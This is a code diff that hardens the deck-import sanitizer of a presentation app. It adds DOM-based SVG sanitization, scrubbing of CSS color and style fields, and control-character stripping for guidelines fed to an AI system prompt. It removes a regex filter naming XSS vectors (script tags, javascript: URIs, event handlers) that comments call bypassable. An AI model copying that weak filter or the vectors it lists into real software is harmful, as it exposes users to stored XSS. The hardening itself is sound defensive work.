-        if (Array.isArray(c.items)) c.items = c.items.slice(0, 10).map((pt) => typeof pt === "string" ? sanitizeString(pt, 500) : typeof pt === "object" && pt.text ? { ...pt, text: sanitizeString(pt.text, 500) } : "");
+        if (Array.isArray(c.items)) c.items = c.items.slice(0, 10).map((pt) => {
+          if (typeof pt === "string") return sanitizeString(pt, 500);
+          if (pt && typeof pt === "object" && pt.text) {
+            const p2 = { ...pt, text: sanitizeString(pt.text, 500) };
+            // Defense-in-depth (v12.67): nested comparison/matrix points aren't spread into
+            // inline CSS today, but scrub style/color so a future renderer change can't leak.
+            if ("style" in p2) { const ps = sanitizeStyle(p2.style); if (ps && Object.keys(ps).length) p2.style = ps; else delete p2.style; }
+            scrubColorFields(p2);
+            return p2;
+          }
+          return "";
+        });
         return c;
       }).filter(Boolean);
     }
@@ -426,32 +764,42 @@ function sanitizeBlock(block) {
     );
   }
   if (clean.type === "svg") {
-    if (typeof clean.markup === "string") {
-      clean.markup = clean.markup.slice(0, 50000)
-        .replace(/<script[\s\S]*?<\/script>/gi, "")
-        .replace(/<foreignObject[\s\S]*?<\/foreignObject>/gi, "")
-        .replace(/<use[\s>][^]*?(?:<\/use>|\/>)/gi, "")
-        .replace(/<animate[\s>][^]*?(?:<\/animate>|\/>)/gi, "")
-        .replace(/<set[\s>][^]*?(?:<\/set>|\/>)/gi, "")
-        .replace(/<iframe[\s\S]*?<\/iframe>/gi, "")
-        .replace(/<embed[\s>][^]*?(?:<\/embed>|\/>)/gi, "")
-        .replace(/<object[\s\S]*?<\/object>/gi, "")
-        .replace(/\bon\w+\s*=/gi, "data-blocked=")
-        .replace(/href\s*=\s*["']javascript:/gi, 'href="')
-        .replace(/xlink:href\s*=\s*["'](?!#)/gi, 'data-blocked-href="')
-        .replace(/style\s*=\s*["'][^"']*url\s*\([^)]*javascript:/gi, 'style="')
-        .replace(/style\s*=\s*["'][^"']*expression\s*\(/gi, 'style="');
-    } else { clean.markup = ""; }
+    // DOM-based sanitization (same pipeline as study-notes/chat diagrams). The previous
+    // regex chain was bypassable: unquoted and whitespace-obfuscated javascript:/data: URIs
+    // in href/xlink:href survived it, yielding stored XSS on click.
+    clean.markup = typeof clean.markup === "string" ? sanitizeSvgMarkup(clean.markup.slice(0, 50000)) : "";
   }
-  // Guard: style must be a plain object, never an array or primitive
-  if (clean.style && (typeof clean.style !== "object" || Array.isArray(clean.style))) delete clean.style;
+  // Guard: style must be allowlisted CSS keys with non-url values — see
+  // sanitizeStyle (audit 2025-05, H2 CSS-exfil fix).
+  if ("style" in clean) {
+    const s = sanitizeStyle(clean.style);
+    if (s && Object.keys(s).length) clean.style = s;
+    else delete clean.style;
+  }
   if (Array.isArray(clean.items)) {
     clean.items = clean.items.map(it => {
-      if (it && typeof it === "object" && it.style && (typeof it.style !== "object" || Array.isArray(it.style))) {
-        const c = { ...it }; delete c.style; return c;
+      if (it && typeof it === "object" && "style" in it) {
+        const s = sanitizeStyle(it.style);
+        const c = { ...it };
+        if (s && Object.keys(s).length) c.style = s;
+        else delete c.style;
+        return c;
       }
       return it;
     });
+  }
+  // Strip CSS auto-load values from color/background scalars on the block and on
+  // every item object (flow/icon-row/grid cell/etc. — cell.bg, cell.border,
+  // item.color, dotColor …). See scrubColorFields above. (v12.61)
+  scrubColorFields(clean);
+  if (Array.isArray(clean.items)) {
+    for (const it of clean.items) scrubColorFields(it);
+  }
+  // The matrix block renders from a separate `quadrants` array (not `items`),
+  // so its per-quadrant color scalar must be scrubbed too. (Same CSS auto-load
+  // class as items; quadrants was previously never visited.)
+  if (Array.isArray(clean.quadrants)) {
+    for (const q of clean.quadrants) scrubColorFields(q);
   }
   return clean;
 }
@@ -534,6 +882,15 @@ function sanitizeSlide(slide) {
     const sn = sanitizeStudyNotes(clean.studyNotes);
     if (sn) clean.studyNotes = sn; else delete clean.studyNotes;
   }
+  // Slide background/color scalars (bg, bgGradient, color, accent, mutedColor)
+  // feed inline CSS directly — scrub CSS auto-load values. See scrubColorFields. (v12.61)
+  scrubColorFields(clean);
+  // bgImage is a background *image* (auto-fetches on render). Restrict to inline
+  // data:image/* — no network — matching the image block / branding-logo rule.
+  if ("bgImage" in clean) {
+    const s = typeof clean.bgImage === "string" ? sanitizeImageDataUri(sanitizeUrl(clean.bgImage, ["data:"])) : "";
+    if (s) clean.bgImage = s; else delete clean.bgImage;
+  }
   return clean;
 }
 
@@ -561,8 +918,9 @@ function sanitizeItem(item) {
 function validateAndSanitizeDeck(raw) {
   if (!raw || typeof raw !== "object") throw new Error("Invalid deck format");
   if (!Array.isArray(raw.lanes)) throw new Error("Missing lanes array");
-  if (raw.lanes.length > 50) throw new Error("Too many lanes (max 50)");
-  const lanes = raw.lanes.map((lane) => {
+  // Clamp rather than throw: a >50-lane deck must not be able to trip an exception
+  // that a fail-open caller would catch and then load raw, unsanitized (sanitizer off-switch).
+  const lanes = raw.lanes.slice(0, 50).map((lane) => {
     if (!lane || typeof lane !== "object") return null;
     const items = Array.isArray(lane.items) ? lane.items.slice(0, 200).map(sanitizeItem).filter(Boolean) : [];
     return { id: uid(), title: sanitizeString(lane.title || "Untitled", 100), collapsed: !!lane.collapsed, items };
@@ -574,7 +932,7 @@ function validateAndSanitizeDeck(raw) {
     accentBar: rawBranding.accentBar !== false,
     accentColor: sanitizeString(rawBranding.accentColor || "#3B82F6", 20),
     accentHeight: typeof rawBranding.accentHeight === "number" ? Math.min(rawBranding.accentHeight, 20) : 4,
-    logo: typeof rawBranding.logo === "string" && rawBranding.logo.startsWith("data:") ? rawBranding.logo : null,
+    logo: sanitizeImageDataUri(typeof rawBranding.logo === "string" ? sanitizeUrl(rawBranding.logo, ["data:"]) : "") || null,
     logoPosition: ["top-left", "top-right", "bottom-left", "bottom-right"].includes(rawBranding.logoPosition) ? rawBranding.logoPosition : "top-left",
     logoSize: typeof rawBranding.logoSize === "number" ? Math.min(rawBranding.logoSize, 120) : 56,
     footerLeft: sanitizeString(rawBranding.footerLeft || "", 100),
@@ -586,7 +944,18 @@ function validateAndSanitizeDeck(raw) {
     imgMaxWidth: typeof rawBranding.imgMaxWidth === "number" ? Math.max(300, Math.min(rawBranding.imgMaxWidth, 960)) : 600,
     imgQuality: typeof rawBranding.imgQuality === "number" ? Math.max(0.15, Math.min(rawBranding.imgQuality, 0.85)) : 0.45,
   };
-  const importedGuidelines = typeof raw.guidelines === "string" ? raw.guidelines.slice(0, 2000) : "";
+  // Branding color scalars (accentColor, footerBg, footerColor) feed inline CSS;
+  // sanitizeString only strips tags/truncates and would pass a short url(...) —
+  // scrub them like every other color field. logo is sanitized as an inline
+  // data: image (raster passthrough, svg routed through sanitizeSvgMarkup). (v12.63)
+  scrubColorFields(importedBranding);
+  // guidelines is deck-supplied text injected into the Vera system prompt. Strip
+  // control chars (defense-in-depth: no smuggled NUL/bidi/format scaffolding) and
+  // cap length. NOTE: this is not a complete prompt-injection defense — the field
+  // is by design honored by the model; treat third-party decks accordingly.
+  const importedGuidelines = typeof raw.guidelines === "string"
+    ? raw.guidelines.replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u206f\ufeff]/g, "").slice(0, 2000)
+    : "";
   return { lanes, guidelines: importedGuidelines, selectedId: null, slideIndex: 0, fullscreen: VELA_PRESENTATION_MODE, chatOpen: false,
     chatMessages: [{ role: "assistant", content: "Deck imported successfully! Ready to sail. ⛵🖖", ts: now() }],
     chatLoading: false, lastDebug: "", branding: importedBranding };
@@ -645,6 +1014,28 @@ const themes = {
 let T = themes.dark;
 const statusColor = (s) => ({ todo: T.textDim, done: T.green, "signed-off": T.purple }[s]);
 const FONT = { display: "'Sora', sans-serif", body: "'DM Sans', sans-serif", mono: "'Space Mono', monospace" };
+
+// Auto-generated module title card ("present card"). Shown as a virtual slide in
+// presentation mode and exported to PDF so the deck exports exactly as presented.
+function buildTitleCardSlide(item, lane, branding) {
+  const accent = branding?.accentColor || T.accent;
+  const slideCount = (item.slides || []).length;
+  const totalTime = (item.slides || []).reduce((a, s) => a + (s.duration || 0), 0);
+  const timeStr = totalTime > 0 ? `${Math.floor(totalTime / 60)}m ${totalTime % 60}s` : "";
+  return {
+    _virtual: true,
+    bg: "linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%)",
+    color: "#0f172a", accent,
+    align: "center", verticalAlign: "center", padding: "60px 80px", gap: 20,
+    blocks: [
+      ...(lane ? [{ type: "badge", text: (lane.title || "").toUpperCase(), bg: accent + "18", color: accent, icon: "Layers" }] : []),
+      { type: "heading", text: item.title, size: "4xl", color: "#0f172a" },
+      ...(timeStr ? [{ type: "text", text: `${slideCount} slide${slideCount !== 1 ? "s" : ""} · ${timeStr}`, size: "lg", color: "#64748b" }] : [{ type: "text", text: `${slideCount} slide${slideCount !== 1 ? "s" : ""}`, size: "lg", color: "#64748b" }]),
+      { type: "spacer", h: 8 },
+    ],
+    duration: 3,
+  };
+}
 
 // ━━━ Vela Logo Icon ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 function VelaIcon({ size = 18, color }) {
